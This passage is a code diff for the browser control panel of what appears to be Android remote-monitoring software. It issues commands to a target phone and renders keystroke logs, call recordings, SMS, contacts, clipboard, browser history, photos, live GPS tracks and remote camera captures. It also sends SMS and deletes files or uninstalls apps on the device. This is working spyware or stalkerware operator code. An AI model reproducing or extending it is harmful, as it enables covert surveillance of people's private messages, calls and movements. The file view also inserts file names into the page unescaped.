+            ctx.drawImage(video, -video.videoWidth/2, -video.videoHeight/2, video.videoWidth, video.videoHeight);
+            ctx.restore();
+            requestAnimationFrame(drawFrame);
+        }
+        drawFrame();
+        const canvasStream = canvas.captureStream(30);
+        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+        mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
+        mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.download = `recording_${Date.now()}.webm`;
+            a.href = url;
+            a.click();
+            URL.revokeObjectURL(url);
+            canvasStream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        document.getElementById('recordBtn').innerText = 'Stop Recording';
+    }
+
+    // ==================== UI RENDERING ====================
+    function toggleCameraPanel(panelId) {
+        const clickPanel = document.getElementById('clickCameraPanel');
+        const livePanel = document.getElementById('liveCameraPanel');
+        if (panelId === 'click') {
+            clickPanel.classList.toggle('show');
+            livePanel.classList.remove('show');
+        } else {
+            livePanel.classList.toggle('show');
+            clickPanel.classList.remove('show');
+        }
+    }
+
+    function capturePicture() {
+        const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
+        const useFlash = document.getElementById('clickFlashCheckbox').checked;
+        sendCommand('CAMERA_SNAPSHOT', { camera, flash: useFlash });
+    }
+
+    function displayCapturedImage(base64) {
+        panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}"><div><button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">💾 SAVE IMAGE</button></div>`;
+    }
+
+    function showAudio(base64) {
+        panel.innerHTML = `<audio controls src="data:audio/3gp;base64,${base64}"></audio><button onclick="downloadBase64('${base64}', 'recording.3gp')">💾 Download</button>`;
+    }
+
+    function downloadBase64(b64, filename) {
+        const a = document.createElement('a');
+        a.href = 'data:application/octet-stream;base64,' + b64;
+        a.download = filename;
+        a.click();
+    }
+
+    // FIXED: Added string parsing for location data
+    function renderMap(loc) {
+        let locationData = loc;
+        if (typeof locationData === 'string') {
+            try {
+                locationData = JSON.parse(locationData);
+            } catch(e) {
+                panel.innerHTML = '<p style="color:#d32f2f;">Invalid location data received</p>';
+                return;
+            }
+        }
+        if (!locationData || (typeof locationData.lat === 'undefined' && typeof locationData.latitude === 'undefined')) {
+            panel.innerHTML = '<p style="color:#d32f2f;">Invalid location data received</p>';
+            return;
+        }
+        const lat = locationData.lat || locationData.latitude;
+        const lon = locationData.lon || locationData.longitude;
+        const accuracy = locationData.accuracy || 10;
+        const provider = locationData.provider || 'unknown';
+        panel.innerHTML = '<div id="map" style="height:400px;"></div>';
+        const mapDiv = document.getElementById('map');
+        const infoDiv = document.createElement('div');
+        infoDiv.className = 'map-info';
+        infoDiv.innerHTML = `<div>📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}</div><div>🎯 Accuracy: ${accuracy.toFixed(1)} m</div><div>📡 Provider: ${provider}</div><div class="addr">🌍 Loading address...</div>`;
+        mapDiv.appendChild(infoDiv);
+        if (mapInstance) mapInstance.remove();
+        mapInstance = L.map(mapDiv).setView([lat, lon], 18);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
+        L.circle([lat, lon], { radius: accuracy, color: '#1976ff' }).addTo(mapInstance);
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, { headers: { 'User-Agent': 'SystemSync-Console/1.0' } })
+            .then(r => r.json())
+            .then(d => infoDiv.querySelector('.addr').innerHTML = `🌍 ${d.display_name || 'Address not found'}`)
+            .catch(() => infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable');
+    }
+
+    function renderTable() {
+        if (!currentData || !currentData.length) { panel.innerHTML = '<p>No data</p>'; return; }
+        let headers = [], rows = [];
+        if (dataType === 'sms') {
+            headers = ['Type', 'Number', 'Message', 'Date'];
+            rows = currentData.map(item => [item.type || (item.type===1?'Incoming':'Outgoing'), item.address||item.number||'Unknown', item.body||'', item.date||item.timeFmt||'']);
+        } else if (dataType === 'call') {
+            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
+            rows = currentData.map(item => [item.type||'', item.number||'', item.name||'', item.date||item.timeFmt||'', item.duration?item.duration+'s':'']);
+        } else { panel.innerHTML = '<p>Unknown data type</p>'; return; }
+        const pageSize = 20, total = Math.ceil(rows.length/pageSize);
+        const start = currentPage*pageSize;
+        const pageRows = rows.slice(start, start+pageSize);
+        let html = '<table><thead><tr>' + headers.map(h=>`<th>${h}</th>`).join('') + '?</thead><tbody>';
+        pageRows.forEach(r => { html += '<tr>' + r.map(cell=>`<td>${cell||''}</td>`).join('') + '</tr>'; });
+        html += '</tbody></table>';
+        if (total>1) {
+            html += '<div class="pagination">';
+            for (let i=0; i<total; i++) html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
+            html += '</div>';
+        }
+        panel.innerHTML = html;
+    }
+
+    function gotoPage(p) { currentPage = p; renderTable(); }
+
+    // File Manager – simple list (preserve tree by showing only current folder)
+    // When a folder is clicked, we replace the panel content with new list; the path is updated.
+    // This keeps the structure simple; to maintain a tree you'd need to store expanded state.
     function renderFiles() {
-        const folders = currentData.filter(i => i.isDir).sort((a,b) => a.name.localeCompare(b.name));
-        const files = currentData.filter(i => !i.isDir).sort((a,b) => a.name.localeCompare(b.name));
-        let html = `<div class="file-manager"><div class="file-toolbar-sticky"><div class="file-toolbar"><button onclick="navigateUp()" class="up-btn">⬆ Up</button><button onclick="downloadSelected()" class="download-btn">⬇️ Download (<span id="downloadCount">${selectedFiles.length}</span>)</button><button onclick="deleteSelected()" class="delete-btn">🗑️ Delete (<span id="deleteCount">${selectedFiles.length}</span>)</button></div></div><div class="tree-content"><ul class="tree-root">`;
-        folders.forEach(f => { html += `<li class="tree-item"><div class="folder-header" onclick="handleFolderClick('${escapeHtml(f.path)}')"><span class="folder-icon">📁</span><span class="item-name">${escapeHtml(f.name)}</span></div></li>`; });
-        files.forEach(f => { html += `<li class="tree-item"><div class="file-row"><input type="checkbox" class="file-checkbox" data-path="${escapeHtml(f.path)}" onchange="updateSelected(this)"><span class="file-icon">📄</span><span class="item-name">${escapeHtml(f.name)}</span><span class="file-size">${formatBytes(f.size)}</span></div></li>`; });
-        if (folders.length === 0 && files.length === 0) html += `<li><div style="padding:20px; color:#999;">No files or folders</div></li>`;
-        html += `</ul></div></div>`; panel.innerHTML = html;
-    }
-    window.handleFolderClick = function(path) { currentPath = path; sendCommand('LIST_FILES', { path: path }); };
-    window.navigateUp = function() { if (currentPath === 'root' || currentPath === '') return; let parts = currentPath.split('/'); parts.pop(); let parent = parts.join('/') || 'root'; currentPath = parent; sendCommand('LIST_FILES', { path: parent }); };
-    window.updateSelected = function(checkbox) { const path = checkbox.dataset.path; if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); } else { selectedFiles = selectedFiles.filter(p => p !== path); } const cnt = selectedFiles.length; const downloadSpan = document.getElementById('downloadCount'); const deleteSpan = document.getElementById('deleteCount'); if (downloadSpan) downloadSpan.innerText = cnt; if (deleteSpan) deleteSpan.innerText = cnt; };
-    window.downloadSelected = function() { if (!selectedFiles.length) return alert('No files selected'); selectedFiles.forEach(p => sendPlainText('dl ' + p)); };
-    window.deleteSelected = function() { if (!selectedFiles.length) return alert('No files selected'); if (!confirm(`Delete ${selectedFiles.length} file(s)?`)) return; selectedFiles.forEach(p => sendCommand('DELETE_FILE', { path: p })); selectedFiles = []; updateCounters(); };
-    function updateCounters() { const cnt = selectedFiles.length; const ds = document.getElementById('downloadCount'); if(ds) ds.innerText = cnt; const ds2 = document.getElementById('deleteCount'); if(ds2) ds2.innerText = cnt; }
+        const panel = document.getElementById('main-panel');
+        if (!panel) return;
 
-    function handleJSON(json) {
-        if (json.type === 'SIGNALING') handleSignalingMessage(json.data);
-        if (Array.isArray(json)) { if (pendingCommand === 'LIST_FILES') { currentData = json; renderFiles(); } pendingCommand = null; return; }
-        switch(json.type) {
-            case 'FILE_LIST': try { const files = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; currentData = Array.isArray(files) ? files : []; renderFiles(); } catch(e){} pendingCommand = null; break;
-            case 'FILE_INFO': fileTransfers[json.transferId] = { chunks: new Array(json.totalChunks), totalChunks: json.totalChunks, fileName: json.fileName, fileSize: json.fileSize, path: json.path, received:0 }; document.getElementById('progressFileName').innerText = json.fileName; document.getElementById('progressPercent').innerText = '0%'; document.getElementById('progressBar').style.width = '0%'; document.getElementById('downloadProgress').style.display = 'block'; break;
-            case 'FILE_CHUNK': const tr = fileTransfers[json.transferId]; if(!tr) return; setTimeout(()=>{ try{ const bin=atob(json.data); const bytes=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i); tr.chunks[json.chunkIndex]=bytes; tr.received++; const pct=Math.round((tr.received/tr.totalChunks)*100); document.getElementById('progressPercent').innerText=pct+'%'; document.getElementById('progressBar').style.width=pct+'%'; if(tr.received===tr.totalChunks){ const blob=new Blob(tr.chunks); const url=URL.createObjectURL(blob); const a=document.createElement('a'); a.href=url; a.download=tr.fileName; a.click(); URL.revokeObjectURL(url); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; showNotification(`✅ Downloaded: ${tr.fileName}`); } } catch(e){ showNotification('Chunk decode error'); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; } },0); break;
-            case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
-            case 'FLASH_ON': flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('🔦 Flashlight ON'); break;
-            case 'FLASH_OFF': flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('🔦 Flashlight OFF'); break;
-            case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES',{path:currentPath}); break;
-            default: console.log('Unhandled type:', json.type);
+        let html = `
+            <div class="file-manager">
+                <div class="file-toolbar-sticky">
+                    <div class="file-toolbar">
+                        <button onclick="navigateUp()">⬆ Back</button>
+                        <span class="file-path">${currentPath}</span>
+                    </div>
+                </div>
+                <div class="tree-content">
+                    <ul class="tree-root">
+        `;
+
+        // Folders
+        currentData.filter(i => i.isDir).forEach(f => {
+            html += `
+                <li class="tree-item">
+                    <div class="folder-header" onclick="handleFolderClick('${f.path}')">
+                        <span class="folder-icon">📁</span>
+                        <span class="item-name">${f.name}</span>
+                    </div>
+                </li>`;
+        });
+
+        // Files
+        currentData.filter(i => !i.isDir).forEach(f => {
+            html += `
+                <li class="tree-item">
+                    <div class="file-row">
+                        <span class="folder-icon">📄</span>
+                        <span class="item-name">${f.name}</span>
+                        <span class="file-size">${formatBytes(f.size)}</span>
+                    </div>
+                </li>`;
+        });
+
+        html += `</ul></div></div>`;
+        panel.innerHTML = html;
+    }
+
+    function handleFolderClick(path) { currentPath = path; sendCommand('LIST_FILES', { path: path }); }
+    function navigateUp() {
+        if (currentPath === 'root' || currentPath === '') return;
+        let parts = currentPath.split('/');
+        parts.pop();
+        let parent = parts.join('/') || 'root';
+        currentPath = parent;
+        sendCommand('LIST_FILES', { path: parent });
+    }
+    function updateSelected(checkbox) {
+        const path = checkbox.dataset.path;
+        if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); }
+        else { selectedFiles = selectedFiles.filter(p=>p!==path); }
+        updateCounters();
+    }
+    function updateCounters() {
+        const cnt = selectedFiles.length;
+        document.getElementById('downloadCount').innerText = cnt;
+        document.getElementById('deleteCount').innerText = cnt;
+    }
+    function downloadSelected() {
+        if (!selectedFiles.length) return alert('No files selected');
+        selectedFiles.forEach(p => sendPlainText('dl ' + p));
+    }
+    function deleteSelected() {
+        if (!selectedFiles.length) return alert('No files selected');
+        if (!confirm(`Delete ${selectedFiles.length} file(s)? This cannot be undone.`)) return;
+        selectedFiles.forEach(p => sendCommand('DELETE_FILE', { path: p }));
+        selectedFiles = [];
+        updateCounters();
+    }
+
+    // ==================== DATA DISPLAY FUNCTIONS ====================
+    // (All functions remain unchanged, but ensure they exist)
+    function displayContacts(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>👥 Contacts</h3><p>No contacts found.</p>'; return; }
+        panel.innerHTML = `<h3>👥 Contacts (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`;
+    }
+
+    function displayInstalledApps(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📱 Apps</h3><p>No apps found.</p>'; return; }
+        panel.innerHTML = `<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
+        document.querySelectorAll('.open-app').forEach(btn => btn.onclick = () => sendCommand('OPEN_APP', { package: btn.dataset.pkg }));
+        document.querySelectorAll('.remove-app').forEach(btn => btn.onclick = () => sendCommand('UNINSTALL_APP', { package: btn.dataset.pkg }));
+    }
+
+    function showAppUsagePanel() {
+        panel.innerHTML = '<h3>📊 Screen Time</h3>' +
+            '<div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">' +
+            '<button data-days="1" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">Today</button>' +
+            '<button data-days="7" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">7 Days</button>' +
+            '<button data-days="30" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">30 Days</button>' +
+            '</div>' +
+            '<p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission in device Settings</p>';
+        panel.querySelectorAll('button[data-days]').forEach(btn => {
+            btn.addEventListener('click', () => sendCommand('GET_APP_USAGE', { days: parseInt(btn.dataset.days) }));
+        });
+        sendCommand('GET_APP_USAGE', { days: 1 });
+    }
+
+    function displayAppUsage(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📊 Screen Time</h3><p>No data. Enable Usage Access in device Settings.</p>'; return; }
+        const max = Math.max(...data.map(a=>a.totalTimeMs||0));
+        panel.innerHTML = `<h3>📊 Screen Time (${data.length} apps)</h3><div>${data.map(app=>{ const t=app.totalTimeMs||0; const h=Math.floor(t/3600000), m=Math.floor((t%3600000)/60000); const pct = max?Math.round(t/max*100):0; return `<div class="app-usage-item"><div class="app-usage-name">${escapeHtml(app.appName||app.packageName||'Unknown')}</div><div class="app-usage-time">${h>0?`${h}h ${m}m`:m+'m'}</div><div style="flex:0.5;"><div class="usage-bar" style="width:${pct}%; background-color:${t>3600000?'#d32f2f':t>1800000?'#ff9800':'#4caf50'}"></div></div></div>`; }).join('')}</div>`;
+    }
+
+    function displayNotifications(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>🔔 Notifications</h3><p>No notifications yet.</p>'; return; }
+        panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>🔔 Notifications (${data.length})</h3><button id="clearNotifBtn">Clear</button></div>`;
+        data.slice().reverse().forEach(n => {
+            const card = document.createElement('div');
+            card.className = 'notification-card';
+            card.innerHTML = `<div><strong>${escapeHtml(n.app||n.packageName||'')}</strong> <small>${n.timeFmt||''}</small></div><div>${escapeHtml(n.title||'')}</div><div>${escapeHtml(n.text||n.body||'')}</div>`;
+            panel.appendChild(card);
+        });
+        document.getElementById('clearNotifBtn')?.addEventListener('click', () => sendCommand('CLEAR_NOTIFICATIONS'));
+    }
+
+    function displayKeylog(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
+        panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
+        document.getElementById('clearKeylogBtn')?.addEventListener('click', () => sendCommand('CLEAR_KEYLOG'));
+    }
+
+    function displayBrowserHistory(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
+        panel.innerHTML = `<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
+    }
+
+    function displayWifiNetworks(data) {
+        panel.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📶 Wi-Fi</h3><p>No networks found.</p>'; return; }
+        panel.innerHTML = `<h3>📶 Wi-Fi Networks (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>SSID</th><th>Signal</th><th>Status</th></tr></thead><tbody>${data.map(n=>{ const bars = n.rssi > -50 ? '████' : n.rssi > -70 ? '███░' : n.rssi > -80 ? '██░░' : '█░░░'; return `<tr style="${n.connected?'background:#f0fff4':''}"><td>${escapeHtml(n.ssid||'(hidden)')}</td><td>${bars}</td><td>${n.connected?'● Connected':'○'}</td></tr>`; }).join('')}</tbody></table></div>`;
+    }
+
+    function displayClipboard(data) {
+        const content = data && data.content ? data.content : (data || '');
+        panel.innerHTML = `<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data && data.type ? data.type : 'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div>`;
+    }
+
+    function toggleLiveGps() {
+        const btn = document.getElementById('liveGpsBtn');
+        if (!liveGpsActive) {
+            sendCommand('START_GPS_UPDATES');
+            liveGpsActive = true;
+            btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
+            btn.style.background = '#d32f2f';
+            btn.style.color = '#fff';
+            showNotification('Live GPS started');
+        } else {
+            sendCommand('STOP_GPS_UPDATES');
+            liveGpsActive = false;
+            btn.querySelector('span:last-child').textContent = 'Live GPS Track';
+            btn.style.cssText = '';
+            showNotification('GPS stopped');
         }
     }
-    function handlePlainText(msg) {
-        if (msg.startsWith("CAMERA_IMAGE:")) displayCapturedImage(msg.substring(13));
-        else if (msg.startsWith("FLASH_ON")) { flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('Flash ON'); }
-        else if (msg.startsWith("FLASH_OFF")) { flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('Flash OFF'); }
-        else if (msg.startsWith('[') || msg.startsWith('{')) { try { handleJSON(JSON.parse(msg)); } catch(e){} }
-    }
-    function handleIncomingMessage(msg) { try { const json = JSON.parse(msg); if (json.type === 'SIGNALING') handleSignalingMessage(json.data); else handleJSON(json); } catch(e) { handlePlainText(msg); } }
 
+    function showGeofencePanel() {
+        panel.innerHTML = '<h3>🗺️ Geofence — Safety Zone</h3><p>Click the map to set the safe zone centre.</p><div id="geofenceMap" style="height:300px;margin-bottom:12px;"></div><div style="display:flex;gap:8px;"><input id="gfLat" placeholder="Latitude"><input id="gfLon" placeholder="Longitude"><input id="gfRadius" placeholder="Radius (m)" value="500"></div><div style="margin-top:8px;"><button id="setFenceBtn">Set Fence</button><button id="clearFenceBtn">Clear</button><button id="getFenceStatusBtn">Status</button></div>';
+        setTimeout(() => {
+            const map = L.map('geofenceMap').setView([20.5937,78.9629],5);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+            let marker, circle;
+            map.on('click', e => {
+                document.getElementById('gfLat').value = e.latlng.lat.toFixed(6);
+                document.getElementById('gfLon').value = e.latlng.lng.toFixed(6);
+                if (marker) map.removeLayer(marker);
+                if (circle) map.removeLayer(circle);
+                marker = L.marker([e.latlng.lat, e.latlng.lng]).addTo(map);
+                const r = parseFloat(document.getElementById('gfRadius').value)||500;
+                circle = L.circle([e.latlng.lat, e.latlng.lng], { radius: r, color: '#1976ff', fillOpacity: 0.15 }).addTo(map);
+            });
+            document.getElementById('setFenceBtn').onclick = () => {
+                const lat = parseFloat(document.getElementById('gfLat').value);
+                const lon = parseFloat(document.getElementById('gfLon').value);
+                const rad = parseFloat(document.getElementById('gfRadius').value)||500;
+                if (isNaN(lat)||isNaN(lon)) return showNotification('Enter valid coordinates');
+                sendCommand('SET_GEOFENCE', { lat, lon, radius: rad });
+            };
+            document.getElementById('clearFenceBtn').onclick = () => sendCommand('CLEAR_GEOFENCE');
+            document.getElementById('getFenceStatusBtn').onclick = () => sendCommand('GET_GEOFENCE');
+        }, 100);
+    }
+
+    function setGeofence() { /* dummy */ }
+    function useLocationAsGeofence(lat, lon) { sendCommand('SET_GEOFENCE', { lat, lon, radius: 500 }); showNotification('Geofence set'); }
+
+    function showSchedulePanel() {
+        panel.innerHTML = '<h3>⏱️ Auto Screenshot</h3><div><label>Interval (minutes): <input id="schedInterval" type="number" value="5" min="1"></label><label>Camera: <select id="schedCam"><option value="0">Rear</option><option value="1">Front</option></select></label><button id="startSched">Start</button><button id="stopSched">Stop</button></div>';
+        document.getElementById('startSched').onclick = () => {
+            const mins = parseInt(document.getElementById('schedInterval').value)||5;
+            const cam = parseInt(document.getElementById('schedCam').value);
+            sendCommand('SET_SCHEDULED_CAPTURE', { intervalMinutes: mins, cameraId: cam });
+        };
+        document.getElementById('stopSched').onclick = () => sendCommand('STOP_SCHEDULED_CAPTURE');
+    }
+
+    function startScheduledCapture() { /* dummy */ }
+
+    function showSendSmsPanel() {
+        panel.innerHTML = '<h3>✉️ Send SMS</h3><div><input id="smsNumber" placeholder="Phone Number"><textarea id="smsBody" rows="4" placeholder="Message"></textarea><button id="sendSmsBtn">Send</button></div>';
+        document.getElementById('sendSmsBtn').onclick = () => {
+            const number = document.getElementById('smsNumber').value.trim();
+            const body = document.getElementById('smsBody').value.trim();
+            if (!number || !body) return showNotification('Enter number and message');
+            sendCommand('SEND_SMS', { number, body });
+        };
+    }
+
+    function showLocationHistoryPanel() {
+        panel.innerHTML = '<h3>📍 Location History</h3><p>GPS fixes logged automatically.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="historyMap" style="height:320px;"></div><div id="historyList"></div>';
+        panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_LOCATION_HISTORY', { days: parseInt(btn.dataset.days) }));
+        setTimeout(() => { window._historyMap = L.map('historyMap').setView([20.5937,78.9629],5); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); }, 100);
+        sendCommand('GET_LOCATION_HISTORY', { days: 3 });
+    }
+
+    function displayLocationHistory(data) {
+        const listDiv = document.getElementById('historyList');
+        if (!listDiv) return;
+        listDiv.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { listDiv.innerHTML = '<p>No history yet.</p>'; return; }
+        if (window._historyMap) {
+            const coords = data.map(p=>[p.lat,p.lon]);
+            if (coords.length>1) L.polyline(coords, {color:'#1976ff',weight:3}).addTo(window._historyMap);
+            data.forEach((p,i) => L.circleMarker([p.lat,p.lon], { radius: i===0?8:5, color: i===0?'#d32f2f':'#1976ff', fillOpacity:0.8 }).addTo(window._historyMap).bindPopup(`<b>${p.timeFmt||''}</b><br>${p.address||(p.lat.toFixed(4)+','+p.lon.toFixed(4))}`));
+            if (coords.length) window._historyMap.setView(coords[0],13);
+        }
+        listDiv.innerHTML = `<table><thead><tr><th>Time</th><th>Location</th><th>Map</th></tr></thead><tbody>${data.map(p=>`<tr><td>${p.timeFmt||''}</td><td>${p.address||(p.lat.toFixed(4)+','+p.lon.toFixed(4))}</td><td><a href="https://maps.google.com/?q=${p.lat},${p.lon}" target="_blank">📍</a></td></tr>`).join('')}</tbody></table>`;
+    }
+
+    function showCallRecordingsPanel() {
+        panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>⚠️ On some devices, only microphone audio may be captured.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="callRecList"></div>';
+        panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_CALL_RECORDINGS', { days: parseInt(btn.dataset.days) }));
+        sendCommand('GET_CALL_RECORDINGS', { days: 5 });
+    }
+
+    function displayCallRecordings(data) {
+        const container = document.getElementById('callRecList');
+        if (!container) return;
+        container.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { container.innerHTML = '<p>No recordings yet.</p>'; return; }
+        data.forEach(rec => {
+            const card = document.createElement('div');
+            card.className = 'call-recording';
+            card.innerHTML = `<div><strong>${rec.direction==='INCOMING'?'📞':'📤'} ${escapeHtml(rec.name||rec.number||'Unknown')}</strong><div>${rec.number||''} • ${rec.duration||''} • ${rec.timeFmt||''}</div></div><button data-id="${rec.id}" data-path="${rec.filePath}">▶ Play</button>`;
+            card.querySelector('button').onclick = () => sendCommand('GET_CALL_AUDIO', { id: rec.id, filePath: rec.filePath });
+            container.appendChild(card);
+        });
+    }
+
+    function playCallRecording(audioData) {
+        const modal = document.createElement('div');
+        modal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999';
+        const box = document.createElement('div');
+        box.style.cssText = 'background:#fff;border-radius:16px;padding:24px;min-width:300px;max-width:90vw';
+        box.innerHTML = `<h3>🎙️ ${escapeHtml(audioData.name||'Call Recording')}</h3><audio controls src="data:audio/mp4;base64,${audioData.audio}" style="width:100%;"></audio><div><button id="dlAudio">💾 Download</button><button id="closeAudio">✕ Close</button></div>`;
+        box.querySelector('#dlAudio').onclick = () => downloadBase64(audioData.audio, audioData.name||'recording.m4a');
+        box.querySelector('#closeAudio').onclick = () => document.body.removeChild(modal);
+        modal.appendChild(box);
+        document.body.appendChild(modal);
+        modal.querySelector('audio').play().catch(()=>{});
+    }
+
+    function showPhotoGalleryPanel() {
+        panel.innerHTML = '<h3>🖼️ Photo Gallery</h3><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="photoGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px;"></div>';
+        panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_RECENT_IMAGES', { days: parseInt(btn.dataset.days) }));
+        sendCommand('GET_RECENT_IMAGES', { days: 5 });
+    }
+
+    function displayPhotoGallery(data) {
+        const grid = document.getElementById('photoGrid');
+        if (!grid) return;
+        grid.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { grid.innerHTML = '<p>No images found.</p>'; return; }
+        data.forEach(img => {
+            const tile = document.createElement('div');
+            tile.style.cssText = 'position:relative;cursor:pointer;border-radius:8px;overflow:hidden;background:#f0f0f0;aspect-ratio:1';
+            if (img.thumb) tile.innerHTML = `<img src="data:image/jpeg;base64,${img.thumb}" style="width:100%;height:100%;object-fit:cover;"><div style="position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.55);color:#fff;font-size:9px;padding:3px;">${img.dateFmt||''}</div>`;
+            else tile.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:32px">🖼️</div>';
+            tile.onclick = () => sendCommand('GET_IMAGE', { mediaId: img.id || img.mediaId });
+            grid.appendChild(tile);
+        });
+    }
+
+    function showFullImage(b64, mediaId) { downloadBase64(b64, `photo_${mediaId||Date.now()}.jpg`); }
+
+    function showAppEventsPanel() {
+        panel.innerHTML = '<h3>📦 App & Call Events</h3><p>App installs/removals and call events.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="appEventsList"></div>';
+        panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_APP_EVENTS', { days: parseInt(btn.dataset.days) }));
+        sendCommand('GET_APP_EVENTS', { days: 5 });
+    }
+
+    function displayAppEvents(data) {
+        const container = document.getElementById('appEventsList');
+        if (!container) return;
+        container.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { container.innerHTML = '<p>No events yet.</p>'; return; }
+        const icons = { INSTALLED:'📱', REMOVED:'🗑️', CALL_INCOMING:'📞', CALL_OUTGOING:'📤', CALL_MISSED:'📵' };
+        data.forEach(ev => {
+            const row = document.createElement('div');
+            row.style.cssText = 'display:flex;align-items:center;gap:12px;padding:10px;border-bottom:1px solid #f0f0f0';
